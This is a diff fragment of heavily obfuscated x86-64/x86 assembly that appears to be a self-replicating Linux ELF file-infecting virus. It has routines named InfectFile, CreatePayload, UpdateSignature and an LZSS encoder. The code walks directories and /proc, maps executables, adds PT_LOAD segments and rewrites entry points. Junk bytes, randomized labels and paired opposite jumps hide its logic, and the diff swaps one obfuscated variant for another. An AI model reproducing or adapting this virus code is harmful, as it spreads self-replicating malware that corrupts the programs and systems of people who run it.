-%endif
+db 0x35, 0xf3
+    jmp         ..@dGwnzrqrDTXD
+..@60hMYYsYEK0a:
+    xor         rax, rax
+    jmp         ..@XNvXzTJxKSFt
+..@ffxxTpdtCFdh:
+    mov         r2, original_virus_len+PADDING
     jmp         $+4
-db 0x47, 0xeb
-    jmp         ..@QrDxmwxg0xUL
-..@qHxRH7xKk6zA:
-    xor         rdx, rdx
-    jb          ..@ePbeJMTCOGJ8
-    jae         ..@ePbeJMTCOGJ8
-..@0n6ENAODxlSD:
-    mov         BYTE [r1], '/'
-    jmp         ..@eu4jYhkSlYhi
-..@BdI5QirtH7bP:
-    shl         edi, 0x8
+db 0xcf, 0xe4
     jmp         $+5
-db 0x27, 0x71, 0x59
-    jmp         $+3
-db 0xa9
-    jmp         $+3
-db 0x93
-    jl          ..@O4RJh4Yshov6
-    jge         ..@O4RJh4Yshov6
-..@uLWScifCIJ4J:
-    xor         r2, r2
-    mov         r2w, WORD [r1+e_h.e_phnum]
-    js          ..@vAHBVmtASHjp
-    jns         ..@vAHBVmtASHjp
-..@tZkZmvBKDdwL:
-    add         r2, rax
-    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
-    mov         QWORD [r2+p_h.p_offset], r3
-    jb          ..@aNoHtXbk9uHY
-    jae         ..@aNoHtXbk9uHY
-..@xg086vKBic5j:
-    xor         r2, r2
-    mov         r2w, WORD [r5+e_h.e_shnum]
-    jmp         ..@4lVGqbyt8kzO
-..@Ge1AIxLE6vKl:
-    jle         ..@CBw5mMcFQ45P
-    js          ..@XGdX1F3FC4ZE
-    jns         ..@XGdX1F3FC4ZE
-..@58ZAdBsY5v3m:
-    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
-    jmp         $+3
-db 0x00
-    jmp         $+4
-db 0xcf, 0x78
-    js          ..@fdZp2SP6azED
-    jns         ..@fdZp2SP6azED
-..@DYH8r9hIF0lI:
-    ret
-    jmp         $+4
-db 0xef, 0x4b
-    js          UnmapFile
-    jns         UnmapFile
-..@mV1A4zx0WmbP:
+db 0x04, 0x7b, 0x75
+    jl          ..@yMFlQOdWcP90
+    jge         ..@yMFlQOdWcP90
+..@lhd4BZJ8awDg:
+    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
+    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
+    je          ..@q7JKIfd3IsNi
+    jne         ..@q7JKIfd3IsNi
+..@HU6azLKCYMB6:
+    rep         stosb
+    jmp         ..@0HcqVLmEz0sX
+..@QPGIokYsnVu8:
     mov         al, BYTE [rsp+_LZSSE_OFF.bits]
     mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
+    jmp         $+4
+db 0xc0, 0xca
+    jmp         $+3
+db 0x28
+    jmp         $+5
+db 0xea, 0xe3, 0x1e
+    jb          ..@wORN9LOXlfnZ
+    jae         ..@wORN9LOXlfnZ
+..@cGP4eVS9c0f1:
+    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
+    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
+    jmp         $+4
+db 0xc9, 0xa5
+    jb          ..@UeDdX8n7MC9z
+    jae         ..@UeDdX8n7MC9z
+..@mS30275tJASv:
+    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
+    jmp         $+3
+db 0x14
+    jb          ..@Q0XURZ3PjlcY
+    jae         ..@Q0XURZ3PjlcY
+..@fDgo3tTEMuNL:
+    add         eax, 0x57
+    jmp         $+3
+db 0xac
+    jl          ..@HuVTGdMto0ir
+    jge         ..@HuVTGdMto0ir
+..@cMKaxZ4Unzef:
+    ret
+    jmp         Strcpy
+..@h4CdhiZkNGku:
+    call        Strcpy
+    VAR         packed, status
+    jmp         ..@mrY8wzck3Gs1
+..@S3Tu4SPEY4if:
+    movzx       rax, BYTE [r2]
+    jmp         ..@VFOG8hxZ28mK
+..@oC7kXEqeEuIm:
+    mov         rax, SYS_WAIT4
+    jmp         $+4
+db 0x16, 0x26
+    jmp         $+4
+db 0x59, 0x66
+    jl          ..@i5I1SLnji789
+    jge         ..@i5I1SLnji789
+..@B5eU9RZlntJj:
+    cmp         BYTE [r2], 0x0
+    jmp         $+4
+db 0x3a, 0x2f
+    jmp         $+5
+db 0x0a, 0xc2, 0x21
+    jl          ..@RNBEKprEyYtf
+    jge         ..@RNBEKprEyYtf
+..@igFgXO1vDWWG:
+    mov         eax, 0x20
+    jmp         $+5
+db 0x95, 0x39, 0x5c
+    jl          ..@HU6azLKCYMB6
+    jge         ..@HU6azLKCYMB6
+..@vLMeYDjrNmE5:
+    je          ..@ebFiM4AFQUuw
+    je          ..@MRWFi7IITEL5
+    jne         ..@MRWFi7IITEL5
+..@8bhq8GrRkYyw:
+    mov         rcx, signature_len
+    js          ..@gGUmXOYXPMIK
+    jns         ..@gGUmXOYXPMIK
+..@5Xxh6Tlgi9LX:
+    cmp         BYTE [r5], DT_REG
+    jmp         ..@CtGHng2tByaI
+..@yBbajFDp4b40:
+    jl          ..@MGXT1k5tio5r
+    jmp         $+4
+db 0x66, 0x14
+    je          ..@WYCIirrUMuau
+    jne         ..@WYCIirrUMuau
+..@T2aQ8F6bVsjc:
+    push        r3
+    push        r2
+    jl          ..@cVnpZp6h4CT9
+    jge         ..@cVnpZp6h4CT9
+..@YEBriIJaBMAv:
+    jmp         ..@HuVTGdMto0ir
+    jmp         ..@fDgo3tTEMuNL
+..@tp01EptcftdQ:
+%ifdef X86_32
+    mov         edx, esi
+%endif
+    jmp         $+5
+db 0xc4, 0x0e, 0xe4
+    jmp         $+3
+db 0xe0
+    jb          ..@3rBVjVMcORPp
+    jae         ..@3rBVjVMcORPp
+..@5QMJVM7XOVqc:
+%ifdef X86_64
+    mov         r10, 0x22
+    mov         r8, 0xffffffffffffffff
+%endif
+    jmp         ..@WX0eesBnV3cs
+..@XdxqlWLQBHLc:
+    syscall
+    jmp         $+5
+db 0xdb, 0x3a, 0xf2
+    je          ..@6yUGC7xASBts
+    jne         ..@6yUGC7xASBts
+..@AGjxJJlq5J0N:
+    cmp         BYTE [rsp+_LZSSE_OFF.character], al
+    jmp         $+5
+db 0x28, 0x90, 0xa8
+    js          ..@saqRpqu3zdQG
+    jns         ..@saqRpqu3zdQG
+..@css0Mku3Lg6e:
+    jnz         ..@R4FxM6IERCtl
+    jmp         $+3
+db 0x62
+    jmp         ..@gEK5sDBcQYmo
+..@7jv4z9bVaHAy:
+    xor         rcx, rcx
+    jmp         ..@ckEHMrJvejhn
+..@AdrpPISIXA1v:
+%ifdef X86_64
+    mov         edx, 11b
+%endif
+    jl          ..@5QMJVM7XOVqc
+    jge         ..@5QMJVM7XOVqc
+..@5Nm77R9P6Ml5:
+    call_vsp    ExitProgram
+    jl          ..@5yXTzM9nOrnz
+    jge         ..@5yXTzM9nOrnz
+..@kKsgl6LDvq91:
+    sub         rsp, _PROC_OFF_size
+    VAR         packed, procdir
+    mov         QWORD [rsp+_PROC_OFF.dirname], r5
+    jmp         $+3
+db 0xf9
+    jmp         $+5
+db 0x4b, 0x68, 0x49
+    js          ..@4ANICuqNYxxG
+    jns         ..@4ANICuqNYxxG
+..@4eY7DTCdAKnB:
+    test        al, al
+    jnz         ..@u3eSpwI3CJEw
+    mov         r1, QWORD [r5+file.fileptr]
+    jb          ..@wUVMi5w87VJ2
+    jae         ..@wUVMi5w87VJ2
+..@mxYCnRyWJlpy:
+    ret
+    jmp         $+5
+db 0xa3, 0xbf, 0x18
+    jmp         $+3
+db 0xd4
+    jb          MapFile
+    jae         MapFile
+..@OOrEl0Nry7A7:
+    xor         r3, r3
+    mov         r1, m6
+    add         r1, _signature-_start
+    jmp         $+5
+db 0x5d, 0x08, 0xb7
+    jmp         $+5
+db 0x93, 0x0f, 0x41
+    jb          ..@96H6TQfqgoQW
+    jae         ..@96H6TQfqgoQW
+..@VdcDE8Ukjlle:
+    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
+    jmp         $+4
+db 0xf8, 0x45
+    jb          ..@Owf8jAwl3pU1
+    jae         ..@Owf8jAwl3pU1
+..@NPxTPVIXOKb6:
+    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
+    jmp         $+3
+db 0xd4
+    jmp         ..@Wesp2uJKn8Ae
+..@Ie6t8FunBGSt:
+    pop         r4
+    jmp         $+5
+db 0x50, 0x96, 0x89
+    jmp         ..@AZNY8vcQkTVa
+..@02DoeAJ124yA:
+    mov         rax, r2
+    movzx       r3, WORD [r1+e_h.e_phentsize]
+    mul         r3 
+    jmp         $+4
+db 0x12, 0x6f
+    jmp         ..@lfRBZa3XcGLF
+..@Q5YkDydcwA4M:
+    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
+    jmp         $+3
+db 0x28
+    jmp         ..@h7lPqNx8SqOi
+..@z5p2uJ1zNGu7:
+    cmp         BYTE [r5], DT_DIR
+    jmp         $+5
+db 0xb0, 0x24, 0xf1
+    jmp         $+3
+db 0xca
+    js          ..@EMOYBXeAaTAU
+    jns         ..@EMOYBXeAaTAU
+..@dGwnzrqrDTXD:
+    CFILE       DWORD [r5+file.filefd]
+    jb          ..@lvxuocqR1LKG
+    jae         ..@lvxuocqR1LKG
+..@nU3RMRtn2ztW:
+    ret
+    jmp         $+5
+db 0xec, 0xaa, 0xb3
+    jmp         $+3
+db 0xd8
+    js          DestroyPayload
+    jns         DestroyPayload
+..@S2ZAvlHIT5v4:
+    syscall
+    jmp         $+4
+db 0x18, 0x09
+    jmp         ..@4eY7DTCdAKnB
+..@etfoIz5aiHgu:
+    xor         rax, rax
+    je          ..@Fb84znZ8Jlae
+    jne         ..@Fb84znZ8Jlae
+..@3cFjwW8DaFMl:
+    cmp         BYTE [r1], 0x39
+    jmp         $+5
+db 0x0b, 0x42, 0x01
+    jmp         $+3
+db 0xe6
+    jmp         $+4
+db 0x9e, 0xd1
+    jmp         ..@HysXOoq8YAw3
+..@admmFm0dmqQ6:
+    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
+    jl          ..@nJOLs7KRiFEA
+    jmp         ..@YdLfCP3OLxvi
+..@mrY8wzck3Gs1:
+    mov         r2, r5
+    call        Strcpy
+    jmp         $+3
+db 0x1e
+    jmp         $+4
+db 0x15, 0x07
+    jmp         $+3
+db 0xc0
+    jb          ..@o23wt7vYA5Cr
+    jae         ..@o23wt7vYA5Cr
+..@vtfhhaZufnE3:
+    add         r4, rax
+    jb          ..@naVkSRdjTKKL
+    jae         ..@naVkSRdjTKKL
+..@22PLG1gO79rZ:
+%ifdef X86_64
+    xor         rdx, rdx
+    xor         r9, r9
+    mov         rsi, original_virus_len+PADDING
+%endif
+    jmp         $+4
+db 0x99, 0x18
+    jmp         $+3
+db 0x8f
+    je          ..@AdrpPISIXA1v
+    jne         ..@AdrpPISIXA1v
+..@kF610wwLqtH1:
+    cmp         eax, 0x3
+    jmp         ..@sN2zXiV0UFov
+..@tFrW7VuAK6e3:
+%ifdef X86_32
+    mov         eax, SYS_MMAP2
+    int         0x80
+    pop         ebp
+%endif
+    jb          ..@b0gyP5nSIRom
+    jae         ..@b0gyP5nSIRom
+..@nCZuxecWubzp:
+    cmp         WORD [r1], './'
+    je          ..@cGP4eVS9c0f1
+    mov         r2d, DWORD [r1]
+    jmp         $+5
+db 0x57, 0x35, 0x52
+    jl          ..@vnhlexeQjq4t
+    jge         ..@vnhlexeQjq4t
+..@F5GJP0OSwuvv:
+    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
+    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
+    add         QWORD [rsp+_PROC_OFF.dirindex], rax
+    jmp         $+5
+db 0x64, 0x4d, 0x3b
+    jb          ..@vtfhhaZufnE3
+    jae         ..@vtfhhaZufnE3
+..@5vI6f72u2sFK:
+    je          ..@0TFSreZN7avO
+    jmp         $+4
+db 0x38, 0x86
+    jmp         $+4
+db 0x9f, 0x1d
+    jmp         $+5
+db 0x65, 0x49, 0x2e
+    jmp         ..@7p3CvulN7ik3
+..@KDyl77Nevxfa:
+    lea         rdi, [rsp+_LZSSE_OFF.buffer]
+    xor         rax, rax
+    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
+    jmp         $+4
+db 0xd7, 0x71
+    jmp         $+3
+db 0x53
+    js          ..@GFM74VBidX4S
+    jns         ..@GFM74VBidX4S
+..@xq8Kb3w9pHem:
+    xor         rdx, rdx
+    jmp         ..@60hMYYsYEK0a
+..@nb8j1yOPBjcj:
+    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
+    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
+    jmp         ..@TG2SY1lJr2M4
+..@0HcqVLmEz0sX:
+    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
+    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
+    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
+    jmp         $+4
+db 0xd2, 0xdc
+    jmp         $+3
+db 0x16
+    jl          ..@FVbnrmrs1RgV
+    jge         ..@FVbnrmrs1RgV
+..@ixf5WGuQeQ27:
+    mov         r2, 1
+    js          ..@U2OeR3g8yKBU
+    jns         ..@U2OeR3g8yKBU
+..@92tgH7fsDH79:
+    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
+    jmp         $+4
+db 0x24, 0x64
+    jl          ..@P9K9gnW58pSG
+    jge         ..@P9K9gnW58pSG
+..@MPA0PN1EMzAQ:
+    call        UnmapFile
+    js          ..@cS6c66HTlUaz
+    jns         ..@cS6c66HTlUaz
+..@ARKp79bYIGkM:
+%ifdef X86_32
+    mov         ecx, r3
+%endif
+    jmp         $+4
+db 0x43, 0x03
+    jl          ..@j4jjioevyQYN
+    jge         ..@j4jjioevyQYN
+..@WYCIirrUMuau:
+    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
+    jl          ..@5SlIFDCBMoj5
+    jge         ..@5SlIFDCBMoj5
+..@JrQf5sqP4je4:
+    CFILE       DWORD [rsp+_PROC_OFF.filefd]
+    jmp         ..@q2kzdUowKCZP
+LzssEncoder:
+    jmp         ..@YbHiqcIxYmDk
+..@wGno3Lq37lNv:
+    xor         rax, rax
+    je          ..@88KHKzk7iMJP
+    jne         ..@88KHKzk7iMJP
+..@CtGHng2tByaI:
+    jne         ..@cGP4eVS9c0f1
+    jmp         $+5
+db 0xe9, 0x57, 0x6b
+    jmp         $+3
+db 0x5d
+    jb          ..@RLw7VHd5KSgN
+    jae         ..@RLw7VHd5KSgN
+..@hxfqGTzCxVYd:
+    mov         r4, 0x1
+    xor         rax, rax
+    mov         eax, SYS_MREMAP
+    jb          ..@YSmfw3iAb0qD
+    jae         ..@YSmfw3iAb0qD
+..@iFVy59tt1XUp:
+    jne         ..@R4FxM6IERCtl
+    jmp         $+5
+db 0xd2, 0x2c, 0x3e
+    js          ..@S3GuQyFfevZm
+    jns         ..@S3GuQyFfevZm
+..@PyTJLkqbD9Kf:
+    mov         r1, rax
+    js          ..@3vQ1fz9XFZya
+    jns         ..@3vQ1fz9XFZya
+..@GMLPTT7m5SkP:
+    xor         r4, r4
+    jmp         ..@oC7kXEqeEuIm
+..@yMFlQOdWcP90:
+    mov         eax, SYS_MUNMAP
+    jb          ..@XdxqlWLQBHLc
+    jae         ..@XdxqlWLQBHLc
+..@ahbwglLJDRtH:
+    ret
+    jmp         FileValidation
+..@Ktrqqo6CscD3:
+    jl          ..@E5hVQgUHALoU
+    jl          ..@NPxTPVIXOKb6
+    jge         ..@NPxTPVIXOKb6
+..@ULGNtgTzUOPR:
+    inc         WORD m5
+    jmp         $+5
+db 0x0b, 0xe7, 0x4f
+    jmp         $+5
+db 0x7c, 0x5c, 0x77
+    jmp         $+4
+db 0x6b, 0x59
+    js          ..@hyhNiw44qDza
+    jns         ..@hyhNiw44qDza
+..@WwCvxZMXDbza:
+    mov         BYTE [r1], 0x00
+    jmp         $+5
+db 0xe5, 0xf6, 0x02
+    jb          ..@Ko57W1GOnZh9
+    jae         ..@Ko57W1GOnZh9
+..@h7lPqNx8SqOi:
+    shl         ebx, LENGTH_BITS
+    js          ..@4gjhzjLOmt6y
+    jns         ..@4gjhzjLOmt6y
+..@9sFjqZXTAW8V:
+    sub         r1, r4
+    call        MemMove
+    inc         WORD m5
+    jmp         $+5
+db 0x91, 0xc4, 0x17
+    jmp         $+3
+db 0xfa
+    jmp         $+4
+db 0x32, 0xa9
+    jmp         $+3
+db 0x43
+    jl          ..@y1qLUpfx4vE3
+    jge         ..@y1qLUpfx4vE3
+UpdateSignature:
+    jmp         ..@tBygYHEDB0ev
+..@SthyxNdQc1hl:
+    jmp         Strcpy
+    jmp         ..@gcIgl41igXcn
+..@ouZrOPgHJLzy:
+    jl          ..@dPD0BooPh80v
+    jmp         ..@Wesp2uJKn8Ae
+    js          ..@tWtXJ5a7f5r8
+    jns         ..@tWtXJ5a7f5r8
+..@OslxAhAtn3Bf:
+    mov         r2w, WORD [r1+e_h.e_phnum]
+    jmp         ..@EQOmeEaGQwBu
+..@DzflMao0AsxA:
+    call        InfectFile
+    jmp         $+4
+db 0x25, 0x3a
+    jmp         $+3
+db 0x77
+    jl          ..@cGP4eVS9c0f1
+    jge         ..@cGP4eVS9c0f1
+..@mH7aNPn4iE6C:
+    jle         ..@Grjy3p8I7hHH
+    jmp         ..@FJbzAIJlRe5q
+..@t75i7PmDsrll:
+    add         rdi, rax
+    jmp         $+5
+db 0x84, 0xfb, 0x0f
+    jmp         $+4
+db 0x94, 0xfb
+    jmp         $+4
+db 0x59, 0x46
+    js          ..@EfPDgmEdYbl1
+    jns         ..@EfPDgmEdYbl1
+..@b0gyP5nSIRom:
+%ifdef X86_64
+    xor         rax, rax
+    xor         rdi, rdi
+    xor         rdx, rdx
+%endif
+    jmp         $+4
+db 0x6e, 0xd4
+    jb          ..@ft9ixVzokrKr
+    jae         ..@ft9ixVzokrKr
+..@c15beUsubYBF:
+    add         rdi, rbx
+    jb          ..@ri6MwqARLp4A
+    jae         ..@ri6MwqARLp4A
+..@3Jhbev2ZJEeL:
+%ifdef X86_32
+    push        ebp
+    xor         ebp, ebp
+%endif
+    jmp         $+4
+db 0x61, 0x1a
+    jb          ..@A8VTU1oIglQd
+    jae         ..@A8VTU1oIglQd
+..@NjTnMfEK7Rpu:
+%ifdef X86_32
+    xor         eax, eax
+%endif
+    jl          ..@Nq03kCGnStMs
+    jge         ..@Nq03kCGnStMs
+..@EMOYBXeAaTAU:
+    jne         ..@5Xxh6Tlgi9LX
+    jmp         $+3
+db 0xe0
+    jl          ..@k9T5NOCkPXrC
+    jge         ..@k9T5NOCkPXrC
+..@I7iHgIXqXGmo:
+    xor         rdx, rdx
+    lea         rdi, [rsp+_LZSSE_OFF.buffer]
+    mov         rsi, rdi
+    jl          ..@c15beUsubYBF
+    jge         ..@c15beUsubYBF
+..@wAMkOLKQilw4:
+    call        MapFile
+    js          ..@pRuCC8QbneUs
+    jns         ..@pRuCC8QbneUs
+..@K5vGHDI1fL2f:
+    shl         edx, POSITION_BITS+LENGTH_BITS
+    jmp         $+4
+db 0x63, 0xb5
+    jmp         ..@Q5YkDydcwA4M
+..@PyEoMv10Zn0q:
+    rep movsb 
+    jb          ..@FBKWjRb6Qqsm
+    jae         ..@FBKWjRb6Qqsm
+..@ZBAxqXiSk8Vs:
+    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
+    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
+    jmp         $+5
+db 0x6c, 0x34, 0xe0
+    jmp         ..@8tm2tgPSpYNf
+..@cYrHtq0NjT1C:
+    ret
+    jmp         $+3
+db 0x73
+    jmp         ..@rZ7qNVQsHsgv
+..@4rSSipskJqEz:
+    mul         r2
+    js          ..@3hS0pnVkBRJH
+    jns         ..@3hS0pnVkBRJH
+..@YdLfCP3OLxvi:
+    xor         rcx, rcx
+    mov         ecx, WINDOW_LENGTH
+    jl          ..@yqyjeOpCzBp9
+    jge         ..@yqyjeOpCzBp9
+DYNPIEValidation:
+    jmp         ..@VIl87moDF44G
+..@X1ECtKy8btt0:
+    call        UnmapFile
+    mov         r2, 11b
+    je          ..@jSqBCZSrL9NA
+    jne         ..@jSqBCZSrL9NA
+..@cS6c66HTlUaz:
+    add         rsp, _INFFILE_OFF_size
+    jmp         $+3
+db 0xa8
+    je          ..@ahbwglLJDRtH
+    jne         ..@ahbwglLJDRtH
+..@nPFo2IJ5tWSF:
+    mov         DWORD [r2], PT_LOAD
+    mov         QWORD [r1+e_h.e_entry], r3
+    jmp         $+3
+db 0x23
+    jmp         $+3
+db 0xf4
+    js          ..@vNTHFHVJc4Ve
+    jns         ..@vNTHFHVJc4Ve
+..@j4jjioevyQYN:
+    je          ..@FBKWjRb6Qqsm
+    cmp         rdi, rsi
+    js          ..@KBiH3UqDtA00
+    jns         ..@KBiH3UqDtA00
+..@5SlIFDCBMoj5:
+    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
+    cmp         rax, 0x00
+    jmp         ..@AAeU2EO7h7Nu
+..@Fb84znZ8Jlae:
+    jmp         ..@RSUiE4NS5Pmy
+    jl          ..@E12MtQHXIwJa
+    jge         ..@E12MtQHXIwJa
+..@4tvjyHdGrguD:
+    xor         rax, rax
+    jmp         ..@VdcDE8Ukjlle
+..@q7JKIfd3IsNi:
+    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
+    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
+    jmp         $+3
+db 0xd7
+    jmp         $+5
+db 0xa5, 0xc7, 0xb3
+    jl          ..@HTxpQXfBEGGO
+    jge         ..@HTxpQXfBEGGO
+..@LZ5jIelEW7yJ:
+    mov         r1, r4
+    jmp         $+4
+db 0x79, 0x90
+    jb          ..@cTeLFbPfQDzc
+    jae         ..@cTeLFbPfQDzc
+..@lvxuocqR1LKG:
+    mov         DWORD [r5+file.filefd], 0x00
+    js          ..@OGPspkwQyrEx
+    jns         ..@OGPspkwQyrEx
+..@r0jEBtDpSJ32:
+    CFILE       [rsp+_INFDIR_OFF.dirfd]
+    jl          ..@MGXT1k5tio5r
+    jge         ..@MGXT1k5tio5r
+..@L9toH1S8GioC:
+    mov         r2, r1
+    add         r2, e_h.e_shoff
+    jmp         ..@0P4QRNrdhrYo
+..@q11p1b4bNtPS:
+    mov         r5, QWORD [r1+file.fileptr]
+    jb          ..@4V0WiCVSx7LX
+    jae         ..@4V0WiCVSx7LX
+..@SjAA1cjKRDba:
+    add         rax, r2
+    mov         r2, rax
+    mov         rax, SYS_FTRUNCATE
+    jmp         $+4
+db 0xf0, 0x7c
+    jl          ..@S2ZAvlHIT5v4
+    jge         ..@S2ZAvlHIT5v4
+..@bnQl9mVciHRN:
+    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
+    js          ..@7jv4z9bVaHAy
+    jns         ..@7jv4z9bVaHAy
+..@PcSPjRb5do1i:
+    sub         rbx, r3
+    add         rax, rbx
+    jl          ..@6SFt36CqftJu
+    jge         ..@6SFt36CqftJu
+..@saqRpqu3zdQG:
+    jne         ..@Grjy3p8I7hHH
+    jmp         $+3
+db 0x01
+    jmp         ..@I7iHgIXqXGmo
+..@hyhNiw44qDza:
+    jmp         ..@oz0w6dKg0d2f
+    jmp         $+3
+db 0x42
+    jmp         $+5
+db 0xb2, 0x7b, 0xd6
+    je          ..@4PTYO4XqPlDG
+    jne         ..@4PTYO4XqPlDG
+..@Fgiw9j80GDpd:
+    cmp         DWORD [r1+1], "home"
+    js          ..@iFVy59tt1XUp
+    jns         ..@iFVy59tt1XUp
+..@k9T5NOCkPXrC:
+    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
+    jge         ..@cGP4eVS9c0f1
+    jb          ..@B8ejZoBIydNL
+    jae         ..@B8ejZoBIydNL
+..@uIQSLyUme2Zn:
+    mov         m6, rax
+    jmp         $+4
+db 0xde, 0x8f
+    jb          ..@PyTJLkqbD9Kf
+    jae         ..@PyTJLkqbD9Kf
+..@UY6ONonz96eO:
+    jmp         ..@pXOpto1Nenc7
+    je          ..@cPJMfmdalc2W
+    jne         ..@cPJMfmdalc2W
+..@1vYdz2IxqmUj:
+    call        AddSizeMappedFile
+    jl          ..@VBOd5pmHZyKq
+    jge         ..@VBOd5pmHZyKq
+..@SC5NgB7EcbW3:
+    lea         r1, [rsp+_INFDIR_OFF.buffer]
+    xor         r2, r2
+    jmp         $+4
+db 0xfa, 0x9d
+    jmp         $+5
+db 0x5a, 0xe5, 0x5b
+    jb          ..@aGQgpSjJ10zS
+    jae         ..@aGQgpSjJ10zS
+..@fEZYZfYiXlPL:
+    cmp         r4w, WORD [r1+e_h.e_phnum]
+    jmp         $+4
+db 0xfb, 0x42
+    jb          ..@eLJhHXkukITJ
+    jae         ..@eLJhHXkukITJ
+..@IeWHdtvy0mkF:
+    xor         rax, rax
+    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
+    jmp         $+4
+db 0x2f, 0x7a
+    jmp         $+4
+db 0x47, 0x4a
+    jmp         $+3
+db 0x95
+    jmp         $+4
+db 0xf3, 0xfd
+    jmp         ..@c6cHv83DmXSN
+..@ZI0VvMoussGt:
+    cmp         WORD [r1], '..'
+    jmp         $+5
+db 0x51, 0x1e, 0xcc
+    jb          ..@ooCeATET1k6E
+    jae         ..@ooCeATET1k6E
+..@ebFiM4AFQUuw:
+    call        DYNPIEValidation
+    jmp         $+4
+db 0x8f, 0xe8
+    jmp         ..@lDPCQjI2IXkd
+NonBinaryFile:
+    jmp         ..@NOnmaeYF4hkj
+..@qdV1CVbXHecl:
+    ret
+    jmp         $+4
+db 0x42, 0xa5
+    js          CreatePayload
+    jns         CreatePayload
+..@A8VTU1oIglQd:
+%ifdef X86_32
+    mov         eax, SYS_MMAP2
+    int         0x80
+    pop         ebp
+%endif
+    jmp         $+4
+db 0x12, 0x5c
+    jmp         $+4
+db 0x77, 0x23
+    jmp         $+5
+db 0xef, 0xd0, 0x7c
+    jmp         $+4
+db 0x9b, 0x10
+    jmp         $+3
+db 0xa8
+    jmp         ..@tHjjQxPTE62q
+..@YlYAIacUZF2V:
+    xor         rax, rax
+    xor         rdx, rdx
+    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
+    jmp         $+5
+db 0xc1, 0x48, 0xe6
+    jmp         $+4
+db 0x78, 0x35
+    jmp         ..@AGjxJJlq5J0N
+..@FBKWjRb6Qqsm:
+    pop         r5
+    jmp         ..@R0B4ee3rnLLU
+..@xRvy4WEkC6ZF:
+    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
+    jmp         ..@IriRmcrWM58o
+..@b0M8V4CQhfqO:
+    add         rcx, 2*bytes
+    jmp         $+5
+db 0xb7, 0x60, 0x7c
+    jmp         $+3
+db 0x9c
+    jmp         ..@wclrNHCxHZ5n
+..@gcIgl41igXcn:
+    ret
+..@eLJhHXkukITJ:
+    jge         ..@oz0w6dKg0d2f
+    jmp         ..@xzzSlNn6IaZj
+..@PcRi3GUg7dO2:
+%ifdef X86_64
+    mov         eax, SYS_MMAP
+%endif
+    jmp         $+4
+db 0xa3, 0xa8
+    jmp         $+3
+db 0x7f
+    jb          ..@8OqqD9iVOi9f
+    jae         ..@8OqqD9iVOi9f
+..@LeSl1KImZMnY:
+    mov         DWORD [r5+file.filefd], eax
+    xor         r1, r1
+    jmp         $+5
+db 0x9e, 0x9b, 0x19
+    jmp         $+5
+db 0x08, 0x11, 0x91
+    jmp         $+5
+db 0xb2, 0x84, 0x56
+    jmp         $+3
+db 0x13
+    jl          ..@Iht8Y88RV8O2
+    jge         ..@Iht8Y88RV8O2
+..@6MaP5NLZJnsu:
+    mov         r5, r2
+    jmp         $+3
+db 0x19
+    js          ..@NwxvB1837AfX
+    jns         ..@NwxvB1837AfX
+..@fKHPCDyP6f2n:
+    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
+    jmp         $+4
+db 0xdb, 0x2f
+    jmp         $+5
+db 0x83, 0xf1, 0x6b
+    jmp         ..@LHlBKxt0HAPR
+..@jfJUAMCAZAwp:
+    je          ..@4PTYO4XqPlDG
+    je          ..@RbCupw3Su7TY
+    jne         ..@RbCupw3Su7TY
+..@Hx1DdU4nrv4F:
+    push        r1
+    sub         rsp, _VADDR_OFF_size
+    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
+    jmp         $+3
+db 0x8b
+    jmp         ..@rN09HOLWLKkx
+..@EYKfcEkgsGn4:
+    mov         r2, QWORD [r5+file.filesize]
+    jmp         ..@hxfqGTzCxVYd
+..@q9eb5rf39ywp:
+    add         rdi, 0x4
+    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
+    mov         QWORD [rdi], rsi
+    jmp         $+5
+db 0xf1, 0xf2, 0xb5
+    jmp         $+4
+db 0x9a, 0x7e
+    jmp         $+4
+db 0xba, 0x72
+    jmp         ..@p7ScmdMeeNVW
+..@EL2u7S8kz1Ne:
+    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
+    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
+    jmp         $+3
+db 0x77
+    jmp         $+3
+db 0x70
+    jmp         ..@L9toH1S8GioC
+..@2ohtfSct515l:
+    rep         movsb
+    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
+    jmp         ..@nJOLs7KRiFEA
+..@hgE5w6Fo7uHx:
+    pop         r5
+    jmp         $+4
+db 0xa8, 0x11
+    jmp         ..@J9s4u9Tbngej
